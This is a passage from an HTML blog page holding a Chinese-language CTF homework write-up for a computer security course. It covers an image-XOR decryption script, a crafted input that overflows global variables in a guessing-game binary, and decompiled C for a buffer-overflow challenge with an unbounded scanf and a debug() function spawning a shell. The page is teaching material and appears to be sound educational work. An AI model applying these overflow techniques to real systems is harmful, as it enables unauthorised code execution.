@@ -1,0 +1,932 @@
+<!DOCTYPE html>
+<html lang="en-us">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='Me: R10725012 呂晟維
+CTF Account: ConstAaEqual7
+Co-operator: R10725052
+Crypto - Image xor 題目附了一個加密的程式，可以發現他是用 arr[i][j] ^= random.randint(0,255) xor 來加密。
+flag.png ^ randint = enc_flag.png golem.png ^ randint = enc_golem.png 配合 xor 做兩次等於沒做的特性以及他的結合率，可以推得以下式子，把 randint 雜訊消除:
+(flag.png ^ randint) ^ (golem.png ^ randint) = flag.png ^ golem.png Decrypt script
+每種邏輯運算都做做看。
+import cv2 from google.colab.patches import cv2_imshow img_a = cv2.imread(&amp;#39;flag_enc.png&amp;#39;, cv2.IMREAD_GRAYSCALE) img_b = cv2.imread(&amp;#39;golem_enc.png&amp;#39;, cv2.IMREAD_GRAYSCALE) bitwiseOr = cv2.bitwise_or(img_a, img_b) cv2_imshow(bitwiseOr) bitwiseXor = cv2.bitwise_xor(img_a, img_b) cv2_imshow(bitwiseXor) bitwiseAnd = cv2.'><title>計算機安全 HW0 CTF write-up</title>
+
+<link rel='canonical' href='https://weberlu88.github.io/p/hw0/'>
+
+<link rel="stylesheet" href="/scss/style.min.css"><meta property='og:title' content='計算機安全 HW0 CTF write-up'>
+<meta property='og:description' content='Me: R10725012 呂晟維
+CTF Account: ConstAaEqual7
+Co-operator: R10725052
+Crypto - Image xor 題目附了一個加密的程式，可以發現他是用 arr[i][j] ^= random.randint(0,255) xor 來加密。
+flag.png ^ randint = enc_flag.png golem.png ^ randint = enc_golem.png 配合 xor 做兩次等於沒做的特性以及他的結合率，可以推得以下式子，把 randint 雜訊消除:
+(flag.png ^ randint) ^ (golem.png ^ randint) = flag.png ^ golem.png Decrypt script
+每種邏輯運算都做做看。
+import cv2 from google.colab.patches import cv2_imshow img_a = cv2.imread(&amp;#39;flag_enc.png&amp;#39;, cv2.IMREAD_GRAYSCALE) img_b = cv2.imread(&amp;#39;golem_enc.png&amp;#39;, cv2.IMREAD_GRAYSCALE) bitwiseOr = cv2.bitwise_or(img_a, img_b) cv2_imshow(bitwiseOr) bitwiseXor = cv2.bitwise_xor(img_a, img_b) cv2_imshow(bitwiseXor) bitwiseAnd = cv2.'>
+<meta property='og:url' content='https://weberlu88.github.io/p/hw0/'>
+<meta property='og:site_name' content='呂晟維 - luweber88.github.io'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2021-10-08T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2021-10-08T00:00:00&#43;00:00'/>
+<meta name="twitter:title" content="計算機安全 HW0 CTF write-up">
+<meta name="twitter:description" content="Me: R10725012 呂晟維
+CTF Account: ConstAaEqual7
+Co-operator: R10725052
+Crypto - Image xor 題目附了一個加密的程式，可以發現他是用 arr[i][j] ^= random.randint(0,255) xor 來加密。
+flag.png ^ randint = enc_flag.png golem.png ^ randint = enc_golem.png 配合 xor 做兩次等於沒做的特性以及他的結合率，可以推得以下式子，把 randint 雜訊消除:
+(flag.png ^ randint) ^ (golem.png ^ randint) = flag.png ^ golem.png Decrypt script
+每種邏輯運算都做做看。
+import cv2 from google.colab.patches import cv2_imshow img_a = cv2.imread(&amp;#39;flag_enc.png&amp;#39;, cv2.IMREAD_GRAYSCALE) img_b = cv2.imread(&amp;#39;golem_enc.png&amp;#39;, cv2.IMREAD_GRAYSCALE) bitwiseOr = cv2.bitwise_or(img_a, img_b) cv2_imshow(bitwiseOr) bitwiseXor = cv2.bitwise_xor(img_a, img_b) cv2_imshow(bitwiseXor) bitwiseAnd = cv2.">
+    </head>
+    <body class="
+    article-page has-toc
+">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex 
+    
+        extended
+    
+">
+    
+        <div id="article-toolbar">
+            <a href="https://weberlu88.github.io/" class="back-home">
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="15 6 9 12 15 18" />
+</svg>
+
+
+
+                <span>Back</span>
+            </a>
+        </div>
+    
+<main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+
+    <h2 class="article-title">
+        <a href="/p/hw0/">計算機安全 HW0 CTF write-up</a>
+    </h2>
+
+    
+
+    
+    <footer class="article-time">
+        
+            <div>
+                <?xml version="1.0" encoding="iso-8859-1"?>
+<!-- Generator: Adobe Illustrator 19.0.0, SVG Export Plug-In . SVG Version: 6.00 Build 0)  -->
+<svg version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px"
+	 viewBox="0 0 512 512" style="enable-background:new 0 0 512 512;" xml:space="preserve">
+<path style="fill:#DCE0E0;" d="M69.09,511.006C30.994,511.006,0,479.87,0,441.599V47.464c0-3.422,2.763-6.197,6.168-6.197h499.663
+	c3.407,0,6.168,2.774,6.168,6.197v394.134c0,38.271-30.993,69.407-69.09,69.407H69.09z"/>
+<path style="fill:#D4554B;" d="M505.832,41.267H6.168C2.763,41.267,0,44.041,0,47.464V161.49h512V47.464
+	C512,44.041,509.238,41.267,505.832,41.267z"/>
+<path style="opacity:0.2;fill:#FFFFFF;enable-background:new    ;" d="M505.832,41.267h-43.655c3.407,0,6.169,2.774,6.169,6.197
+	V161.49H512V47.464C512,44.041,509.238,41.267,505.832,41.267z"/>
+<path style="opacity:0.1;enable-background:new    ;" d="M475.786,476.969H101.965c-38.096,0-69.09-31.136-69.09-69.407V41.267
+	H6.168C2.763,41.267,0,44.041,0,47.464v394.134c0,38.271,30.994,69.407,69.09,69.407H442.91c28.024,0,52.187-16.858,63.015-41.001
+	C496.811,474.462,486.585,476.969,475.786,476.969z"/>
+<g>
+	<path style="fill:#FFFFFF;" d="M84.105,261.375h53.501c2.188,0,3.962-1.772,3.962-3.96v-53.503c0-2.187-1.774-3.962-3.962-3.962
+		H84.105c-2.189,0-3.964,1.775-3.964,3.962v53.503C80.141,259.602,81.916,261.375,84.105,261.375z"/>
+	<path style="fill:#FFFFFF;" d="M181.2,261.375h53.499c2.189,0,3.964-1.772,3.964-3.96v-53.503c0-2.187-1.775-3.962-3.964-3.962
+		H181.2c-2.189,0-3.964,1.775-3.964,3.962v53.503C177.236,259.602,179.011,261.375,181.2,261.375z"/>
+	<path style="fill:#FFFFFF;" d="M277.301,261.375h53.501c2.189,0,3.964-1.772,3.964-3.96v-53.503c0-2.187-1.775-3.962-3.964-3.962
+		h-53.501c-2.187,0-3.962,1.775-3.962,3.962v53.503C273.339,259.602,275.113,261.375,277.301,261.375z"/>
+	<path style="fill:#FFFFFF;" d="M374.396,261.375h53.503c2.185,0,3.96-1.772,3.96-3.96v-53.503c0-2.187-1.775-3.962-3.96-3.962
+		h-53.503c-2.188,0-3.962,1.775-3.962,3.962v53.503C370.434,259.602,372.208,261.375,374.396,261.375z"/>
+	<path style="fill:#FFFFFF;" d="M84.105,360.451h53.501c2.188,0,3.962-1.773,3.962-3.963v-53.5c0-2.188-1.774-3.965-3.962-3.965
+		H84.105c-2.189,0-3.964,1.777-3.964,3.965v53.5C80.141,358.678,81.916,360.451,84.105,360.451z"/>
+	<path style="fill:#FFFFFF;" d="M181.2,360.451h53.499c2.189,0,3.964-1.773,3.964-3.963v-53.5c0-2.188-1.775-3.965-3.964-3.965
+		H181.2c-2.189,0-3.964,1.777-3.964,3.965v53.5C177.236,358.678,179.011,360.451,181.2,360.451z"/>
+	<path style="fill:#FFFFFF;" d="M277.301,360.451h53.501c2.189,0,3.964-1.773,3.964-3.963v-53.5c0-2.188-1.775-3.965-3.964-3.965
+		h-53.501c-2.187,0-3.962,1.777-3.962,3.965v53.5C273.339,358.678,275.113,360.451,277.301,360.451z"/>
+	<path style="fill:#FFFFFF;" d="M374.396,360.451h53.503c2.185,0,3.96-1.773,3.96-3.963v-53.5c0-2.188-1.775-3.965-3.96-3.965
+		h-53.503c-2.188,0-3.962,1.777-3.962,3.965v53.5C370.434,358.678,372.208,360.451,374.396,360.451z"/>
+	<path style="fill:#FFFFFF;" d="M84.105,459.524h53.501c2.188,0,3.962-1.773,3.962-3.962v-53.501c0-2.188-1.774-3.964-3.962-3.964
+		H84.105c-2.189,0-3.964,1.776-3.964,3.964v53.501C80.141,457.751,81.916,459.524,84.105,459.524z"/>
+	<path style="fill:#FFFFFF;" d="M181.2,459.524h53.499c2.189,0,3.964-1.773,3.964-3.962v-53.501c0-2.188-1.775-3.964-3.964-3.964
+		H181.2c-2.189,0-3.964,1.776-3.964,3.964v53.501C177.236,457.751,179.011,459.524,181.2,459.524z"/>
+	<path style="fill:#FFFFFF;" d="M277.301,459.524h53.501c2.189,0,3.964-1.773,3.964-3.962v-53.501c0-2.188-1.775-3.964-3.964-3.964
+		h-53.501c-2.187,0-3.962,1.776-3.962,3.964v53.501C273.339,457.751,275.113,459.524,277.301,459.524z"/>
+	<path style="fill:#FFFFFF;" d="M374.396,459.524h53.503c2.185,0,3.96-1.773,3.96-3.962v-53.501c0-2.188-1.775-3.964-3.96-3.964
+		h-53.503c-2.188,0-3.962,1.776-3.962,3.964v53.501C370.434,457.751,372.208,459.524,374.396,459.524z"/>
+</g>
+<g>
+	<path style="fill:#41484E;" d="M64.177,0.994c-9.864,0-17.86,8.032-17.86,17.942v55.817c0,9.91,7.996,17.943,17.86,17.943
+		c9.863,0,17.858-8.033,17.858-17.943V18.936C82.036,9.027,74.039,0.994,64.177,0.994z"/>
+	<path style="fill:#41484E;" d="M140.907,0.994c-9.864,0-17.859,8.032-17.859,17.942v55.817c0,9.91,7.996,17.943,17.859,17.943
+		s17.859-8.033,17.859-17.943V18.936C158.765,9.027,150.77,0.994,140.907,0.994z"/>
+	<path style="fill:#41484E;" d="M217.634,0.994c-9.863,0-17.858,8.032-17.858,17.942v55.817c0,9.91,7.996,17.943,17.858,17.943
+		c9.864,0,17.86-8.033,17.86-17.943V18.936C235.495,9.027,227.499,0.994,217.634,0.994z"/>
+	<path style="fill:#41484E;" d="M294.366,0.994c-9.864,0-17.86,8.032-17.86,17.942v55.817c0,9.91,7.996,17.943,17.86,17.943
+		c9.865,0,17.858-8.033,17.858-17.943V18.936C312.224,9.027,304.229,0.994,294.366,0.994z"/>
+	<path style="fill:#41484E;" d="M371.093,0.994c-9.863,0-17.859,8.032-17.859,17.942v55.817c0,9.91,7.996,17.943,17.859,17.943
+		c9.865,0,17.858-8.033,17.858-17.943V18.936C388.953,9.027,380.958,0.994,371.093,0.994z"/>
+	<path style="fill:#41484E;" d="M447.824,0.994c-9.865,0-17.86,8.032-17.86,17.942v55.817c0,9.91,7.995,17.943,17.86,17.943
+		c9.862,0,17.858-8.033,17.858-17.943V18.936C465.683,9.027,457.686,0.994,447.824,0.994z"/>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+</svg>
+
+                <time class="article-time--published">Oct 08, 2021</time>
+            </div>
+        
+
+        
+            <div>
+                <?xml version="1.0" encoding="iso-8859-1"?>
+<!-- Generator: Adobe Illustrator 19.0.0, SVG Export Plug-In . SVG Version: 6.00 Build 0)  -->
+<svg version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px"
+	 viewBox="0 0 512 512" style="enable-background:new 0 0 512 512;" xml:space="preserve">
+<path style="fill:#DCE0E0;" d="M330.311,257.815c77.955-35.78,133.303-126.189,133.303-232.085H48.385
+	c0,105.897,55.948,196.305,133.904,232.085c-77.955,35.78-133.904,126.19-133.904,232.087h415.229
+	C463.614,384.005,408.266,293.595,330.311,257.815z"/>
+<path style="opacity:0.1;enable-background:new    ;" d="M59.023,489.902c-2.837,0-5.552-1.154-7.52-3.195
+	c-1.97-2.042-3.024-4.796-2.922-7.631c1.704-47.231,14.68-92.708,37.523-131.511c24.065-40.877,57.325-71.913,96.185-89.75
+	c-38.86-17.836-72.12-48.871-96.185-89.749C63.261,129.261,50.285,83.786,48.581,36.555c-0.102-2.835,0.953-5.589,2.922-7.631
+	c1.969-2.042,4.683-3.195,7.52-3.195h33.643c5.634,0,10.254,4.466,10.443,10.098c1.598,47.499,14.583,93.227,37.549,132.239
+	c20.258,34.413,47.545,62.331,78.908,80.738c3.196,1.876,5.16,5.305,5.16,9.011c0,3.706-1.963,7.136-5.16,9.011
+	c-31.364,18.407-58.649,46.326-78.908,80.739c-22.967,39.012-35.952,84.74-37.549,132.239c-0.189,5.632-4.809,10.098-10.443,10.098
+	H59.023z"/>
+<g>
+	<path style="fill:#FFFFFF;" d="M429.318,465.651c-4.028,0-7.514-3.008-8.014-7.108c-4.01-32.927-14.103-63.398-29.998-90.569
+		c-2.255-3.854-0.957-8.805,2.895-11.06c3.855-2.254,8.805-0.957,11.06,2.896c17.015,29.088,27.812,61.648,32.093,96.777
+		c0.54,4.432-2.616,8.464-7.048,9.002C429.975,465.631,429.645,465.651,429.318,465.651z"/>
+	<path style="opacity:0.2;fill:#FFFFFF;enable-background:new    ;" d="M330.311,257.815
+		c77.955,35.78,133.303,126.19,133.303,232.086h-44.852C418.762,347.621,330.311,257.815,330.311,257.815"/>
+</g>
+<path style="fill:#48587C;" d="M154.912,475.615c4.629-26.33,14.847-50.346,29.874-69.625c19.48-24.993,44.772-38.753,71.215-38.753
+	c26.445,0,51.737,13.76,71.214,38.751c15.027,19.28,25.245,43.295,29.875,69.627H154.912z"/>
+<path style="fill:#FCB63E;" d="M488.345,489.58c0,12.384-10.402,22.42-23.233,22.42H46.888c-12.831,0-23.233-10.036-23.233-22.42
+	v-24.457c0-12.383,10.403-22.42,23.233-22.42h418.224c12.831,0,23.233,10.037,23.233,22.42V489.58z"/>
+<path style="opacity:0.1;enable-background:new    ;" d="M80.185,489.58v-24.457c0-12.383,10.402-22.42,23.233-22.42h-56.53
+	c-12.831,0-23.233,10.037-23.233,22.42v24.457c0,12.384,10.403,22.42,23.233,22.42h56.531C90.587,512,80.185,501.964,80.185,489.58z
+	"/>
+<g>
+	<path style="fill:#48587C;" d="M255.999,242.912c-7.658,0-14.07-5.734-14.914-13.339c-37.895-4.29-72.757-24.312-100.817-57.9
+		c-2.6-3.113-5.168-6.387-7.635-9.734c-2.338-3.173-2.692-7.393-0.914-10.911s5.384-5.736,9.326-5.736h229.908
+		c3.941,0,7.548,2.218,9.326,5.736c1.778,3.517,1.424,7.736-0.913,10.91c-2.46,3.336-5.027,6.611-7.633,9.731
+		c-28.063,33.591-62.925,53.614-100.819,57.903C270.071,237.174,263.66,242.912,255.999,242.912z"/>
+	<circle style="fill:#48587C;" cx="255.999" cy="275.477" r="15.012"/>
+	<circle style="fill:#48587C;" cx="255.999" cy="323.062" r="15.012"/>
+</g>
+<path style="fill:#FCB63E;" d="M488.345,46.876c0,12.384-10.402,22.418-23.233,22.418H46.888c-12.831,0-23.233-10.034-23.233-22.418
+	V22.418C23.654,10.037,34.057,0,46.888,0h418.224c12.831,0,23.233,10.037,23.233,22.418V46.876z"/>
+<path style="opacity:0.1;enable-background:new    ;" d="M80.185,46.876V22.418C80.185,10.037,90.587,0,103.418,0h-56.53
+	C34.057,0,23.655,10.037,23.655,22.418v24.458c0,12.384,10.403,22.418,23.233,22.418h56.531
+	C90.587,69.294,80.185,59.26,80.185,46.876z"/>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+</svg>
+ 
+                <time class="article-time--reading">
+                    4 minute read
+                </time>
+            </div>
+        
+    </footer>
+    
+</div>
+</header>
+
+    <section class="article-content">
+    <blockquote>
+<p>Me: R10725012 呂晟維<br>
+CTF Account: ConstAaEqual7<br>
+Co-operator: R10725052</p>
+</blockquote>
+<h2 id="crypto---image-xor">Crypto - Image xor</h2>
+<ol>
+<li>
+<p>題目附了一個加密的程式，可以發現他是用 <code>arr[i][j] ^= random.randint(0,255)</code> xor 來加密。</p>
+<ul>
+<li>flag.png ^ randint =  enc_flag.png</li>
+<li>golem.png ^ randint = enc_golem.png</li>
+</ul>
+</li>
+<li>
+<p>配合 xor 做兩次等於沒做的特性以及他的結合率，可以推得以下式子，把 randint 雜訊消除:</p>
+<ul>
+<li>(flag.png ^ randint) ^ (golem.png ^ randint) = flag.png ^ golem.png</li>
+</ul>
+</li>
+<li>
+<p><strong>Decrypt script</strong><br>
+每種邏輯運算都做做看。</p>
+</li>
+</ol>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">cv2</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">google.colab.patches</span> <span class="kn">import</span> <span class="n">cv2_imshow</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">img_a</span> <span class="o">=</span> <span class="n">cv2</span><span class="o">.</span><span class="n">imread</span><span class="p">(</span><span class="s1">&#39;flag_enc.png&#39;</span><span class="p">,</span> <span class="n">cv2</span><span class="o">.</span><span class="n">IMREAD_GRAYSCALE</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">img_b</span> <span class="o">=</span> <span class="n">cv2</span><span class="o">.</span><span class="n">imread</span><span class="p">(</span><span class="s1">&#39;golem_enc.png&#39;</span><span class="p">,</span> <span class="n">cv2</span><span class="o">.</span><span class="n">IMREAD_GRAYSCALE</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">bitwiseOr</span> <span class="o">=</span> <span class="n">cv2</span><span class="o">.</span><span class="n">bitwise_or</span><span class="p">(</span><span class="n">img_a</span><span class="p">,</span> <span class="n">img_b</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">cv2_imshow</span><span class="p">(</span><span class="n">bitwiseOr</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">bitwiseXor</span> <span class="o">=</span> <span class="n">cv2</span><span class="o">.</span><span class="n">bitwise_xor</span><span class="p">(</span><span class="n">img_a</span><span class="p">,</span> <span class="n">img_b</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">cv2_imshow</span><span class="p">(</span><span class="n">bitwiseXor</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">bitwiseAnd</span> <span class="o">=</span> <span class="n">cv2</span><span class="o">.</span><span class="n">bitwise_and</span><span class="p">(</span><span class="n">img_a</span><span class="p">,</span> <span class="n">img_b</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">cv2_imshow</span><span class="p">(</span><span class="n">bitwiseAnd</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 聽說這樣的畫質更清晰 cv2_imwrite(img_a ^ img_b)</span>
+</span></span></code></pre></div><p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 80; 
+			flex-basis: 192px"
+	>
+	<a href="/p/hw0/hint.png" data-size="868x1080">
+		<img src="/p/hw0/hint.png"
+			width="868"
+			height="1080"
+			srcset="/p/hw0/hint_hu982980fa26eebdc9740973d9e8fdceaa_390557_480x0_resize_box_3.png 480w, /p/hw0/hint_hu982980fa26eebdc9740973d9e8fdceaa_390557_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			alt="Flag">
+	</a>
+	
+	<figcaption>Flag</figcaption>
+	
+</figure></p>
+<h2 id="rev---global-variable-overflow">Rev - Global variable overflow</h2>
+<ol>
+<li>
+<p><strong>Reverse engineering dumping C code</strong><br>
+這題是一個 XAYB 的猜數字遊戲，透過 IDA 反組譯出程式碼，嘗試接合 main、game_logic、gen_ans 三個函數，發現可以直接產生 flag 字串，但好像缺了幾個字。一時沒有頭緒只好換方法。
+<figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 336; 
+			flex-basis: 808px"
+	>
+	<a href="/p/hw0/img-cpp.png" data-size="569x169">
+		<img src="/p/hw0/img-cpp.png"
+			width="569"
+			height="169"
+			srcset="/p/hw0/img-cpp_hu99791748d0dcd13395f60c6c609d65c3_8302_480x0_resize_box_3.png 480w, /p/hw0/img-cpp_hu99791748d0dcd13395f60c6c609d65c3_8302_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+</li>
+<li>
+<p><strong>Closer look into game logic</strong><br>
+仔細看 game_logic 函數，在遊戲開始時並不會直接要你猜數字，會先讓玩家輸入長度 %100s 的字串並存入 <code>backdoor</code> 變數，才呼叫 gen_ans() 產生出答案。疑? 原來 backdoor 是個未初始化的全域變數，可以在 <code>.bss</code> section 中發現未初始化的全域變數還有 4 個(如下)，這時會對四個全域變數做驗證，如果驗證通個會偷偷印出答案！</p>
+<ul>
+<li>byte_4082</li>
+<li>byte_4088</li>
+<li>byte_408D</li>
+<li>byte_408E</li>
+</ul>
+<p>這 4 個全域變數大小都是一個 byte，在 C 中 char 型別剛好是 1 個 byte，範圍是 0x0000 ~ 0x1111，假如這四個變數都是 signed char 那他們的十進位範圍為 -128~127。 (補充: int 是 4B，short 是 2B)
+<figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 175; 
+			flex-basis: 422px"
+	>
+	<a href="/p/hw0/img-game-logic.png" data-size="816x464">
+		<img src="/p/hw0/img-game-logic.png"
+			width="816"
+			height="464"
+			srcset="/p/hw0/img-game-logic_hu0918dab0b358e5bbdfd0c6ff2ee008e5_34500_480x0_resize_box_3.png 480w, /p/hw0/img-game-logic_hu0918dab0b358e5bbdfd0c6ff2ee008e5_34500_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			alt="game_logic() 在遊戲開始前會將使用者的輸入存進 backdoor">
+	</a>
+	
+	<figcaption>game_logic() 在遊戲開始前會將使用者的輸入存進 backdoor</figcaption>
+	
+</figure>
+<figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 82; 
+			flex-basis: 198px"
+	>
+	<a href="/p/hw0/img-gan-ans.png" data-size="648x784">
+		<img src="/p/hw0/img-gan-ans.png"
+			width="648"
+			height="784"
+			srcset="/p/hw0/img-gan-ans_hu399fd06b570714ab30a8d143729a2cc8_47276_480x0_resize_box_3.png 480w, /p/hw0/img-gan-ans_hu399fd06b570714ab30a8d143729a2cc8_47276_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			alt="line 24, 27 各有一個 if 驗證四個全域變數的值">
+	</a>
+	
+	<figcaption>line 24, 27 各有一個 if 驗證四個全域變數的值</figcaption>
+	
+</figure><br>
+<figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 290; 
+			flex-basis: 696px"
+	>
+	<a href="/p/hw0/img-ida-backdoor.png" data-size="877x302">
+		<img src="/p/hw0/img-ida-backdoor.png"
+			width="877"
+			height="302"
+			srcset="/p/hw0/img-ida-backdoor_hu451c8ecc18240bb716f94a73f1b64771_26721_480x0_resize_box_3.png 480w, /p/hw0/img-ida-backdoor_hu451c8ecc18240bb716f94a73f1b64771_26721_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			alt="byte_xxxx 變數都是 1 byte 大小，但中間有空格，不是連續儲存的">
+	</a>
+	
+	<figcaption>byte_xxxx 變數都是 1 byte 大小，但中間有空格，不是連續儲存的</figcaption>
+	
+</figure></p>
+</li>
+<li>
+<p><strong>Solve the Math Problem</strong><br>
+兩個 if 區塊的驗證是一段數學謎題，第一個 if 很簡單，除 8 回去就找到答案了；第二個 if 我們需要做質因數分解(Prime factorization)，也許有多種解法。</p>
+<table>
+<thead>
+<tr>
+<th>變數</th>
+<th>值 (#解一)</th>
+<th>值 (#解二)</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>byte_4082</td>
+<td>71 = G</td>
+<td>71 = G</td>
+</tr>
+<tr>
+<td>byte_4088</td>
+<td>78 = N</td>
+<td>126 = ~</td>
+</tr>
+<tr>
+<td>byte_408D</td>
+<td>110 = n</td>
+<td>131 =  (超過127了舉得不好&hellip;)</td>
+</tr>
+<tr>
+<td>byte_408E</td>
+<td>105 = i</td>
+<td>88 = X</td>
+</tr>
+</tbody>
+</table>
+</li>
+<li>
+<p><strong>Overflow to get the answer &amp; win the game</strong><br>
+由於這四個變數是非連續儲存的，我們用字串 <code>a</code> 補齊空的記憶體位置，若採用解法一，我們輸入 aaGaaaaaNaaaani 以開始遊戲（G=71, N=78, n=110, i=105）:</p>
+<ul>
+<li>G*8=568</li>
+<li>n*i+N=11628<br>
+程式便會吐出答案，但是順序是倒序的。
+<figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 211; 
+			flex-basis: 507px"
+	>
+	<a href="/p/hw0/img-gdb-win.png" data-size="628x297">
+		<img src="/p/hw0/img-gdb-win.png"
+			width="628"
+			height="297"
+			srcset="/p/hw0/img-gdb-win_huee5516e1c37edfc50bbd013b28b9416a_144047_480x0_resize_box_3.png 480w, /p/hw0/img-gdb-win_huee5516e1c37edfc50bbd013b28b9416a_144047_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			alt="get flag with gdb">
+	</a>
+	
+	<figcaption>get flag with gdb</figcaption>
+	
+</figure></li>
+</ul>
+</li>
+</ol>
+<h2 id="pwn---buffer-overflow">Pwn - Buffer overflow</h2>
+<ol>
+<li>
+<p><strong>Checksec: No pie, No canary</strong></p>
+<ul>
+<li><strong>canary</strong>: 保護 return address 的機制。會在每個 function stack frame 的 local variable 之後 saved rbp 之前的位置，加上 8 bytes 的隨機值，在 function epilogue 時會檢查取用另一 segment 中 canary 的值檢查兩者是否一致，若不一致則直接 abort 調程式而不會進行 return。</li>
+<li><strong>PIE</strong>: Position-Independent Executable，若沒有開啟 PIE，程式載入的記憶體位址會與編譯時的位址相同，就等同我們在 gdb 等工具上看到的記憶體位址。若開啟 PIE，程式載入則是隨機的。</li>
+<li>這題的這兩個保護措施故意被關掉了，所以可以進行 bof 攻擊。</li>
+</ul>
+</li>
+<li>
+<p><strong>Function <em>debug</em> is a webshell, but cannot reach</strong></p>
+<ul>
+<li>透過 objdump gdb 等工具，我們可以看到程式除了 main 方法還有一個 debug 方法，透過 IDA 反組譯看到他的原始碼是一個 shell，感謝助教開後門xdd；不過沒有方法呼叫到 debug 這題的伺服器又開在遠端，所以只能靠 bof 了。</li>
+<li>__isoc99_scanf 沒有設定讀取的字串長度，會一路讀到 EOF，沒能擋下 bof。</li>
+</ul>
+</li>
+</ol>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">debug</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nf">system</span><span class="p">(</span><span class="s">&#34;sh&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">v4</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span> <span class="c1">// [rsp+0h] [rbp-20h] BYREF
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">  <span class="nf">init</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Hey, nice to meet you!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Just wanna ask, which linux distribution are you using?&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">__isoc99_scanf</span><span class="p">(</span><span class="s">&#34;%s&#34;</span><span class="p">,</span> <span class="n">v4</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="n">aOhhSweetByTheW</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
